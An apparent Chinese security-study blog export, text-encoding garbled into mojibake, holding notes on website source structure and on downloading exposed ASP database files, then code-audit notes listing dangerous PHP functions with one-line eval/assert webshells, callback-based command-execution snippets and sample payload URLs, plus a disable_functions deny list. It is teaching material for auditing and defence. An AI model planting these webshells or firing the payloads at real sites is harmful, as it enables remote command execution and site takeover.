<h2 id="DAY4-åŸºç¡€å…¥é—¨-WEBæºç æ‹“å±•"><a href="#DAY4-åŸºç¡€å…¥é—¨-WEBæºç æ‹“å±•" class="headerlink" title="DAY4 åŸºç¡€å…¥é—¨-WEBæºç æ‹“å±•"></a>DAY4 åŸºç¡€å…¥é—¨-WEBæºç æ‹“å±•</h2><p><img src="/2022/07/21/xiaodi/image-20220727150617311.png" alt="image-20220727150617311"></p>
<p><img src="/2022/07/21/xiaodi/image-20220727150829672.png" alt="image-20220727150829672"></p>
<h3 id="1-ç½‘ç«™æºç æ–‡ä»¶ç›®å½•"><a href="#1-ç½‘ç«™æºç æ–‡ä»¶ç›®å½•" class="headerlink" title="1.ç½‘ç«™æºç æ–‡ä»¶ç›®å½•"></a>1.ç½‘ç«™æºç æ–‡ä»¶ç›®å½•</h3><p><code>admin</code>ï¼šåå°æ–‡ä»¶ç›®å½•</p>
<p><code>data</code>ï¼šæ•°æ®ç›¸å…³ï¼Œå¯èƒ½æœ‰æ•°æ®åº“é…ç½®æ–‡ä»¶ã€å¯èƒ½ç›´æ¥è¿æ¥åˆ°å¯¹æ–¹çš„æ•°æ®åº“è·å¾—å¯¹æ–¹çš„æ•°æ®åº“ä¿¡æ¯ã€‘</p>
<p><code>include</code>ï¼šæ•°æ®åº“ç›®å½•</p>
<p><code>template</code>ï¼šç½‘ç«™æ¨¡æ¿æ–‡ä»¶,å’Œç½‘ç«™ç•Œé¢ç›¸å…³ï¼Œä¼˜åŒ–ç½‘ç«™æ¶æ„ã€(è‰¹çš¿è‰¹ )æƒ³èµ·å­¦sstiæ¼æ´ï¼Œçœ‹äº†å¥½å‡ å¤©æ–‡ç« ã€‘</p>
<h3 id="2-ASPï¼ŒPHPï¼ŒASPï¼ŒJSPï¼ŒJAVAWEBç­‰è„šæœ¬ç±»å‹å®‰å…¨é—®é¢˜"><a href="#2-ASPï¼ŒPHPï¼ŒASPï¼ŒJSPï¼ŒJAVAWEBç­‰è„šæœ¬ç±»å‹å®‰å…¨é—®é¢˜" class="headerlink" title="2.ASPï¼ŒPHPï¼ŒASPï¼ŒJSPï¼ŒJAVAWEBç­‰è„šæœ¬ç±»å‹å®‰å…¨é—®é¢˜"></a>2.ASPï¼ŒPHPï¼ŒASPï¼ŒJSPï¼ŒJAVAWEBç­‰è„šæœ¬ç±»å‹å®‰å…¨é—®é¢˜</h3><p>å¯ä»¥åœ¨è¿™ä¸ªç½‘ç«™ä¸Šçœ‹çœ‹è„šæœ¬è¯­è¨€ç±»å‹</p>
<p><code>https://websec.readthedocs.io/zh/latest/language/index.html</code></p>
<p>å½“çœ‹åˆ°ç½‘ç«™çš„è„šæœ¬æ ¼å¼æ—¶ï¼Œå°±å¤§è‡´å¯ä»¥çŒœæµ‹åˆ°å¤§æ¦‚å®¹æ˜“å‡ºç°ä»€ä¹ˆæ¼æ´ï¼Œ</p>
<p>å› ä¸ºç½‘ç«™æºç è¯­è¨€å’Œåº”ç”¨ä¸åŒï¼Œç¼–å†™çš„æ–¹å¼ä¹Ÿä¸åŒï¼Œå‡ºç°çš„é—®é¢˜ä¹Ÿå°±ä¸åŒï¼Œä»è€Œé’ˆå¯¹æ€§çš„å¯»æ‰¾æˆ–ä¿®å¤æ¼æ´ï¼ŒèŠ‚çº¦æ—¶é—´ï¼Œæé«˜æ•ˆç‡</p>
<h3 id="3-ç¤¾äº¤ï¼Œè®ºå›ï¼Œé—¨æˆ·ï¼Œç¬¬ä¸‰æ–¹ï¼Œåšå®¢ç­‰ä¸åŒä»£ç æœºåˆ¶å¯¹åº”æ¼æ´"><a href="#3-ç¤¾äº¤ï¼Œè®ºå›ï¼Œé—¨æˆ·ï¼Œç¬¬ä¸‰æ–¹ï¼Œåšå®¢ç­‰ä¸åŒä»£ç æœºåˆ¶å¯¹åº”æ¼æ´" class="headerlink" title="3.ç¤¾äº¤ï¼Œè®ºå›ï¼Œé—¨æˆ·ï¼Œç¬¬ä¸‰æ–¹ï¼Œåšå®¢ç­‰ä¸åŒä»£ç æœºåˆ¶å¯¹åº”æ¼æ´"></a>3.ç¤¾äº¤ï¼Œè®ºå›ï¼Œé—¨æˆ·ï¼Œç¬¬ä¸‰æ–¹ï¼Œåšå®¢ç­‰ä¸åŒä»£ç æœºåˆ¶å¯¹åº”æ¼æ´</h3><h3 id="4-å¼€æºï¼Œæœªå¼€æºé—®é¢˜ï¼Œæ¡†æ¶éæ¡†æ¶é—®é¢˜ï¼Œå…³äºCMSè¯†åˆ«é—®é¢˜åŠåç»­ç­‰"><a href="#4-å¼€æºï¼Œæœªå¼€æºé—®é¢˜ï¼Œæ¡†æ¶éæ¡†æ¶é—®é¢˜ï¼Œå…³äºCMSè¯†åˆ«é—®é¢˜åŠåç»­ç­‰" class="headerlink" title="4.å¼€æºï¼Œæœªå¼€æºé—®é¢˜ï¼Œæ¡†æ¶éæ¡†æ¶é—®é¢˜ï¼Œå…³äºCMSè¯†åˆ«é—®é¢˜åŠåç»­ç­‰"></a>4.å¼€æºï¼Œæœªå¼€æºé—®é¢˜ï¼Œæ¡†æ¶éæ¡†æ¶é—®é¢˜ï¼Œå…³äºCMSè¯†åˆ«é—®é¢˜åŠåç»­ç­‰</h3><p>CMSï¼šå†…å®¹ç®¡ç†ç³»ç»Ÿï¼ˆcontent management systemï¼ŒCMSï¼‰ï¼Œæ˜¯ä¸€ç§ä½äºWEBå‰ç«¯ï¼ˆWeb  æœåŠ¡å™¨ï¼‰å’Œåç«¯åŠå…¬ç³»ç»Ÿæˆ–æµç¨‹ï¼ˆå†…å®¹åˆ›ä½œã€ç¼–è¾‘ï¼‰ä¹‹é—´çš„è½¯ä»¶ç³»ç»Ÿã€‚å†…å®¹çš„åˆ›ä½œäººå‘˜ã€ç¼–è¾‘äººå‘˜ã€å‘å¸ƒäººå‘˜ä½¿ç”¨å†…å®¹ç®¡ç†ç³»ç»Ÿæ¥æäº¤ã€ä¿®æ”¹ã€å®¡æ‰¹ã€å‘å¸ƒå†…å®¹ã€‚è¿™é‡ŒæŒ‡çš„â€œå†…å®¹â€å¯èƒ½åŒ…æ‹¬æ–‡ä»¶ã€è¡¨æ ¼ã€å›¾ç‰‡ã€æ•°æ®åº“ä¸­çš„æ•°æ®ç”šè‡³è§†é¢‘ç­‰ä¸€åˆ‡ä½ æƒ³è¦å‘å¸ƒåˆ°Internetã€<a href="https://baike.baidu.com/item/Intranet/3247037">Intranet</a>ä»¥åŠ<a href="https://baike.baidu.com/item/Extranet/10579301">Extranet</a>ç½‘ç«™çš„ä¿¡æ¯ã€‚</p>
<h3 id="5-å…³äºæºç è·å–ç›¸å…³é€”å¾„"><a href="#5-å…³äºæºç è·å–ç›¸å…³é€”å¾„" class="headerlink" title="5.å…³äºæºç è·å–ç›¸å…³é€”å¾„"></a>5.å…³äºæºç è·å–ç›¸å…³é€”å¾„</h3><p>æœç´¢ï¼Œå’¸é±¼æ·˜å®ï¼Œç¬¬ä¸‰æ–¹æºç ç«™ï¼Œå„ç§è¡Œä¸šå¯¹åº”ï¼Œä¸€äº›æºç å¯èƒ½å°±å¯ä»¥æ‰¾åˆ°æºç ï¼Œä½†ä¸€èˆ¬æ˜¯å¤§ä¼—å‹çš„ï¼Œè€Œä¸€äº›å°å‹ï¼ˆæˆ–è€…ç°è‰²çš„ç½‘ç«™ï¼‰ç½‘ç«™å¯èƒ½æœä¸åˆ°çš„ï¼Œå’¸é±¼ç­‰ä¸€äº›ç¬¬ä¸‰æ–¹æºç å¯èƒ½æ‰¾åˆ°çš„</p>
<h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="#æ€»ç»“"></a>#æ€»ç»“</h3><p>å…³æ³¨åº”ç”¨åˆ†ç±»åŠè„šæœ¬ç±»å‹ä¼°æ‘¸å‡ºå¯èƒ½å­˜åœ¨çš„æ¼æ´(å…¶ä¸­æ¡†æ¶ç±»ä¾‹å¤–)ï¼Œåœ¨è·å–æºç åå¯è¿›è¡Œæœ¬åœ°å®‰å…¨æµ‹è¯•æˆ–ä»£ç å®¡è®¡ï¼Œä¹Ÿå¯ä»¥åˆ†æå…¶ç›®å½•å·¥ä½œåŸç†(æ•°æ®åº“å¤‡ä»½ï¼Œbakæ–‡ä»¶ç­‰)ï¼Œæœªè·å–åˆ°çš„æºç é‡‡ç”¨å„ç§æ–¹æ³•æƒ³åŠæ³•è·å–!</p>
<hr>
<h3 id="aspç½‘ç«™"><a href="#aspç½‘ç«™" class="headerlink" title="aspç½‘ç«™"></a>aspç½‘ç«™</h3><p>æœ‰ä¸€ä¸ªmdbæ–‡ä»¶ã€è¡¨æ ¼æ–‡ä»¶ã€‘ï¼Œå­˜æ”¾æ•°æ®ï¼Œç›¸å½“äºæ•°æ®åº“ï¼Œåå°çš„è´¦å·å¯†ç ä¸€èˆ¬åœ¨ä¸Šé¢</p>
<p>å¦‚æœç½‘ç«™æ˜¯ç›´æ¥å¥—ç”¨çš„ç½‘ç«™æºç ç»“æ„ï¼Œæ²¡æœ‰è¿›è¡Œä¿®æ”¹ï¼Œå…¶ä¸­å°±åŒ…æ‹¬æ•°æ®åº“è·¯å¾„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å°è¯•æŠŠæ•°æ®åº“çš„è·¯å¾„é˜²æ­¢ç‰©è”ç½‘ç½‘ä¸Šå°è¯•ä¸‹è½½ã€ä¸€èˆ¬æ˜¯è¿›è¡Œè¿‡æ»¤äº†ï¼Œå‡ ä¹ä¸å¯èƒ½ä¸‹è½½æˆåŠŸã€‘ï¼Œ</p>
<p>æ¯”å¦‚çŸ¥é“<code>www.hahaha.com</code>è¿™ä¸ªç½‘ç«™çš„æ•°æ®åº“åœ¨<code>/admin/schema/</code>è¿™ä¸ªè·¯å¾„é‡Œï¼Œæ•°æ®åº“æ–‡ä»¶åä¸º<code>flag.mdb</code></p>
<p>é‚£æˆ‘ä»¬è®¿é—®<code>www.hahaha.com/admin/schema/flag.mdb</code>å°±å¯èƒ½ä¸‹è½½ä¸‹æ¥æ•°æ®åº“æ–‡ä»¶ï¼ŒæŸ¥çœ‹é‡Œé¢çš„åå°çš„è´¦å·å’Œå¯†ç ã€å¯†ç ä¸€èˆ¬åŠ å¯†äº†çš„(md5)ã€‘</p>
<h3 id="phpç½‘ç«™"><a href="#phpç½‘ç«™" class="headerlink" title="phpç½‘ç«™"></a>phpç½‘ç«™</h3>]]></content>
      <categories>
        <category>ç½‘ç»œå®‰å…¨å­¦ä¹ </category>
      </categories>
  </entry>
  <entry>
    <title>ä»£ç å®¡è®¡çŸ¥è¯†ç‚¹è®°å½•</title>
    <url>/2022/06/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    <content><![CDATA[<p><u><code>ä»£ç å®¡è®¡å­¦ä¹ çš„ä¸€äº›ç¬”è®°</code></u></p>
<span id="more"></span>

<h1 id="ä»£ç å®¡è®¡-å¸¸è§phpå¨èƒå‡½æ•°ï¼ˆä¸Šï¼‰"><a href="#ä»£ç å®¡è®¡-å¸¸è§phpå¨èƒå‡½æ•°ï¼ˆä¸Šï¼‰" class="headerlink" title="ä»£ç å®¡è®¡-å¸¸è§phpå¨èƒå‡½æ•°ï¼ˆä¸Šï¼‰"></a>ä»£ç å®¡è®¡-å¸¸è§phpå¨èƒå‡½æ•°ï¼ˆä¸Šï¼‰</h1><p>æ–‡ç« æ¥è‡ª<a href="https://baijiahao.baidu.com/s?id=1715285716686081123&wfr=spider&for=pc">æˆéƒ½çŸ¥é“åˆ›å®‡</a></p>
<h2 id="1-å¸¸è§phpå›è°ƒå‡½æ•°ï¼Œå¯è°ƒç”¨å…¶ä»–å‘½ä»¤-ä»£ç æ‰§è¡Œå‡½æ•°"><a href="#1-å¸¸è§phpå›è°ƒå‡½æ•°ï¼Œå¯è°ƒç”¨å…¶ä»–å‘½ä»¤-ä»£ç æ‰§è¡Œå‡½æ•°" class="headerlink" title="1.å¸¸è§phpå›è°ƒå‡½æ•°ï¼Œå¯è°ƒç”¨å…¶ä»–å‘½ä»¤/ä»£ç æ‰§è¡Œå‡½æ•°"></a>1.å¸¸è§phpå›è°ƒå‡½æ•°ï¼Œå¯è°ƒç”¨å…¶ä»–å‘½ä»¤/ä»£ç æ‰§è¡Œå‡½æ•°</h2><p>call_user_func()</p>
<p>call_user_func_array()</p>
<p>create_function()</p>
<p>array_walk()</p>
<p>array_map()</p>
<p>array_filter()</p>
<p>usort()</p>
<p>ob_start()</p>
<p>å¯å˜å‡½æ•°$_GET<a href="$_GET%5B'b'%5D">â€˜aâ€™</a></p>
<h2 id="2-å¸¸è§phpå¯æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°ï¼š"><a href="#2-å¸¸è§phpå¯æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°ï¼š" class="headerlink" title="2.å¸¸è§phpå¯æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°ï¼š"></a>2.å¸¸è§phpå¯æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°ï¼š</h2><p>system()ã€passthru()ã€exec()ã€shell_exec()ã€ pcntl_exec()ã€popen()ã€proc_open()</p>
<h2 id="3-å¸¸è§phpå¯ä»£ç æ‰§è¡Œçš„å‡½æ•°ï¼š"><a href="#3-å¸¸è§phpå¯ä»£ç æ‰§è¡Œçš„å‡½æ•°ï¼š" class="headerlink" title="3.å¸¸è§phpå¯ä»£ç æ‰§è¡Œçš„å‡½æ•°ï¼š"></a>3.å¸¸è§phpå¯ä»£ç æ‰§è¡Œçš„å‡½æ•°ï¼š</h2><p>eval()ã€assert()ã€preg_replace()ã€$</p>
<h2 id="4-ç¦ç”¨å±é™©å‡½æ•°ï¼š"><a href="#4-ç¦ç”¨å±é™©å‡½æ•°ï¼š" class="headerlink" title="4.ç¦ç”¨å±é™©å‡½æ•°ï¼š"></a>4.ç¦ç”¨å±é™©å‡½æ•°ï¼š</h2><p>phpé…ç½®æ–‡ä»¶php.inié‡Œæœ‰ä¸ªdisable_functions = é…ç½®é€‰é¡¹ï¼Œå¯è‡ªå®šä¹‰ç¦ç”¨æŸäº›phpå±é™©å‡½æ•°.å¦‚:disable_functions =system,passthru,shell_exec,exec,popen</p>
<h2 id="ä¸€ã€å¯æ‰§è¡Œphpä»£ç çš„å‡½æ•°"><a href="#ä¸€ã€å¯æ‰§è¡Œphpä»£ç çš„å‡½æ•°" class="headerlink" title="ä¸€ã€å¯æ‰§è¡Œphpä»£ç çš„å‡½æ•°"></a>ä¸€ã€å¯æ‰§è¡Œphpä»£ç çš„å‡½æ•°</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="title function_ invoke__">assert</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>php 7.1.7 ï¼Œå·²ç»æ— æ³•ç”¨call_user_funcå›è°ƒè°ƒç”¨ test.php?cmd=phpinfo(); preg_replace()  5.6ä»¥ä¸‹å¯ä»¥æ‰§è¡Œ 5.6ä»¥ä¸Šä»ç„¶å¯ä»¥æ‰§è¡Œï¼Œä½†æ˜¯ä¼šæœ‰è­¦å‘Š PHP7åå·²ç»ä¸æ”¯æŒ/eä¿®é¥°ç¬¦  preg_replace(â€œ/test/eâ€,$_GET[â€œhâ€],â€jutst testâ€); //å°†jutst  testä»¥/testæ­£åˆ™åŒ¹é…ä»¥hæ¥æ›¿æ¢ /e ä¿®æ­£ç¬¦ä½¿ preg_replace() å°† replacement å‚æ•°å½“ä½œ PHP ä»£ç   ?h=phpinfo() ${phpinfo()}</p>
<h2 id="äºŒã€å¸¸è§phpå›è°ƒå‡½æ•°ï¼Œå¯è°ƒç”¨å…¶ä»–å‘½ä»¤-ä»£ç æ‰§è¡Œå‡½æ•°ï¼š"><a href="#äºŒã€å¸¸è§phpå›è°ƒå‡½æ•°ï¼Œå¯è°ƒç”¨å…¶ä»–å‘½ä»¤-ä»£ç æ‰§è¡Œå‡½æ•°ï¼š" class="headerlink" title="äºŒã€å¸¸è§phpå›è°ƒå‡½æ•°ï¼Œå¯è°ƒç”¨å…¶ä»–å‘½ä»¤/ä»£ç æ‰§è¡Œå‡½æ•°ï¼š"></a>äºŒã€å¸¸è§phpå›è°ƒå‡½æ•°ï¼Œå¯è°ƒç”¨å…¶ä»–å‘½ä»¤/ä»£ç æ‰§è¡Œå‡½æ•°ï¼š</h2><h3 id="1-call-user-func"><a href="#1-call-user-func" class="headerlink" title="1) call_user_func()"></a>1) call_user_func()</h3><p>call_user_func â€” æŠŠç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°è°ƒç”¨, å…¶ä½™å‚æ•°æ˜¯å›è°ƒå‡½æ•°çš„å‚æ•° </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a1&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;a2&#x27;</span>]);</span><br><span class="line"><span class="comment">//xxx.php?a1=system&amp;a2=whoami  //å‘½ä»¤æ‰§è¡Œ</span></span><br><span class="line"><span class="comment">//xxx.php?a1=assert&amp;a2=phpinfo()   //ä»£ç æ‰§è¡Œ </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h3 id="2-call-user-func-array"><a href="#2-call-user-func-array" class="headerlink" title="2)call_user_func_array()"></a>2)call_user_func_array()</h3><p>call_user_func_array()æŠŠç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°ï¼ˆcallbackï¼‰è°ƒç”¨ï¼ŒæŠŠå‚æ•°æ•°ç»„ä½œï¼ˆparam_arrï¼‰ä¸ºå›è°ƒå‡½æ•°çš„çš„å‚æ•°ä¼ å…¥</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a1&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;a2&#x27;</span>]);</span><br><span class="line"><span class="comment">//xxx.php?a1=system&amp;a2[]=whoami</span></span><br><span class="line"><span class="comment">//xxx.php?a1=assert&amp;a2[]=phpinfo()</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h3 id="3-create-function"><a href="#3-create-function" class="headerlink" title="3)create_function()"></a>3)create_function()</h3><p>åˆ›å»ºåŒ¿åå‡½æ•°ï¼ˆAnonymous functionsï¼‰ï¼Œå…è®¸ ä¸´æ—¶åˆ›å»ºä¸€ä¸ªæ²¡æœ‰æŒ‡å®šåç§°çš„å‡½æ•°ã€‚æœ€ç»å¸¸ç”¨ä½œå›è°ƒå‡½æ•°ï¼ˆcallbackï¼‰å‚æ•°çš„å€¼</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;&#x27;</span>, @<span class="variable">$_REQUEST</span>[<span class="string">&#x27;a&#x27;</span>]);<span class="variable">$b</span>();</span><br><span class="line"><span class="comment">//xxx.php?a=phpinfo();</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h3 id="4-array-walk"><a href="#4-array-walk" class="headerlink" title="4) array_walk()"></a>4) array_walk()</h3><p>array_walk â€” ä½¿ç”¨ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°å¯¹æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ åšå›è°ƒå¤„ç†</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">array_walk</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]);</span><br><span class="line"><span class="comment">//xxx.php?a[]=phpinfo()&amp;b=assert</span></span><br><span class="line"><span class="comment">//xxx.php?a[]=whoami&amp;b=system</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h3 id="5-array-map"><a href="#5-array-map" class="headerlink" title="5)array_map()"></a>5)array_map()</h3><p>array_map()ä¸ºæ•°ç»„çš„æ¯ä¸ªå…ƒç´ åº”ç”¨å›è°ƒå‡½æ•°ã€‚è¿”å›æ•°ç»„ï¼Œæ˜¯ä¸º array1 æ¯ä¸ªå…ƒç´ åº”ç”¨ callbackå‡½æ•°ä¹‹åçš„æ•°ç»„ã€‚callback å‡½æ•°å½¢å‚çš„æ•°é‡å’Œä¼ ç»™ array_map() æ•°ç»„æ•°é‡ï¼Œä¸¤è€…å¿…é¡»ä¸€æ ·ã€‚</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">array_map</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]);</span><br><span class="line"><span class="comment">//xxx.php?a=system&amp;b[]=whoami</span></span><br><span class="line"><span class="comment">//xxx.php?a=assert&amp;b[]=phpinfo()</span></span><br><span class="line"><span class="comment">//$array = array(0,1,2,3,4,5);</span></span><br><span class="line"><span class="comment">//array_map($_GET[&#x27;a&#x27;],$array);</span></span><br><span class="line"><span class="comment">//.php?a=phpinfo </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h3 id="6-array-filter"><a href="#6-array-filter" class="headerlink" title="6) array_filter()"></a>6) array_filter()</h3><p>array_filter()ç”¨å›è°ƒå‡½æ•°è¿‡æ»¤æ•°ç»„ä¸­çš„å•å…ƒã€‚ä¾æ¬¡å°† array æ•°ç»„ä¸­çš„æ¯ä¸ªå€¼ä¼ é€’åˆ° callback å‡½æ•°ã€‚å¦‚æœ callback å‡½æ•°è¿”å› trueï¼Œ åˆ™ array æ•°ç»„çš„å½“å‰å€¼ä¼šè¢«åŒ…å«åœ¨è¿”å›çš„ç»“æœæ•°ç»„ä¸­ã€‚æ•°ç»„çš„é”®åä¿ç•™ä¸å˜ã€‚</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">array_filter</span>(<span class="keyword">array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]),<span class="variable">$_GET</span>[<span class="string">&#x27;func&#x27;</span>]);</span><br><span class="line"><span class="comment">//?func=system&amp;cmd=whoami</span></span><br><span class="line"><span class="comment">//?func=assert&amp;cmd=phpinfo() </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h3 id="7-å¯å˜å‡½æ•°-var-args"><a href="#7-å¯å˜å‡½æ•°-var-args" class="headerlink" title="7) å¯å˜å‡½æ•°$var(args)"></a>7) å¯å˜å‡½æ•°$var(args)</h3><p>PHP æ”¯æŒå¯å˜å‡½æ•°çš„æ¦‚å¿µã€‚å¦‚æœä¸€ä¸ªå˜é‡ååæœ‰åœ†æ‹¬å·ï¼ŒPHP å°†å¯»æ‰¾ä¸å˜é‡çš„å€¼åŒåçš„å‡½æ•°ï¼Œ å¹¶ä¸”å°è¯•æ‰§è¡Œå®ƒã€‚å¯å˜å‡½æ•°å¯ä»¥ç”¨æ¥å®ç°åŒ…æ‹¬å›è°ƒå‡½æ•°ï¼Œå‡½æ•°è¡¨åœ¨å†…çš„ä¸€äº›ç”¨é€”ã€‚</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>](<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]);</span><br><span class="line"><span class="comment">//xxx.php?a=system&amp;b=whoami</span></span><br><span class="line"><span class="comment">//xxx?a=assert&amp;b=phpinfo()</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h3 id="8-usort"><a href="#8-usort" class="headerlink" title="8) usort()"></a>8) usort()</h3><p>æœ¬å‡½æ•°å°†ç”¨ç”¨æˆ·è‡ªå®šä¹‰çš„æ¯”è¾ƒå‡½æ•°å¯¹ä¸€ä¸ªæ•°ç»„ä¸­çš„å€¼è¿›è¡Œæ’åº php5.6ä¹‹å‰å¯ä»¥</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">usort</span>(...<span class="variable">$_GET</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">payload: <span class="number">1</span>.php?<span class="number">1</span>[<span class="number">0</span>]=<span class="number">0</span>&amp;<span class="number">1</span>[<span class="number">1</span>]=<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>])&amp;<span class="number">2</span>=assert POSTä¼ å‚: x=<span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure></div>

<h3 id="9ï¼‰uasort"><a href="#9ï¼‰uasort" class="headerlink" title="9ï¼‰uasort"></a>9ï¼‰uasort</h3><p>php5.6 php7ä¸å¯ä»¥</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$onearray</span> = <span class="keyword">array</span>(<span class="string">&#x27;Ameng&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">uasort</span>(<span class="variable">$onearray</span>, <span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">payload: <span class="number">1</span>.php?a=assert POSTä¼ å‚: x=<span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure></div>

<h3 id="10ï¼‰ob-start"><a href="#10ï¼‰ob-start" class="headerlink" title="10ï¼‰ob_start"></a>10ï¼‰ob_start</h3><p>ob_start â€” æ‰“å¼€è¾“å‡ºæ§åˆ¶ç¼“å†²</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$foobar</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">ob_start</span>(<span class="variable">$foobar</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;h&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">ob_end_flush</span>(); </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">/test.php?h=whoami&amp;b=system</span><br></pre></td></tr></table></figure></div>

